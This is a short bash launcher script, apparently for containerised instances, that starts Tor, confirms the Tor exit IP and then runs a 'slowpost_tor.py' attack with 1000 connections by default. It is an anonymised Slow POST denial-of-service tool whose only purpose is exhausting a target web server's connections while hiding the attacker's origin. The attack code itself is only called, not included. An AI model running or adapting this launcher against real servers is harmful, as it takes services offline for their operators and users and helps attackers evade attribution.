#!/bin/bash
echo "Instance: $CONTAINER_NAME - Tor+SlowPOST starting at $(date)"

tor --RunAsDaemon 1 --SocksPort 9050 --DataDirectory /tmp/tor_data 2>/dev/null
echo "[*] Waiting for Tor to bootstrap..."
for i in $(seq 1 30); do
  if grep -q "Bootstrapped 100" /tmp/tor_data/notices.log 2>/dev/null; then
    echo "[+] Tor bootstrapped!"
    break
  fi
  sleep 2
done

TOR_IP=$(curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('IP','?'))" 2>/dev/null || echo "unknown")
echo "[*] Tor exit IP: $TOR_IP"

python3 /app/slowpost_tor.py "${CONNECTIONS:-1000}"
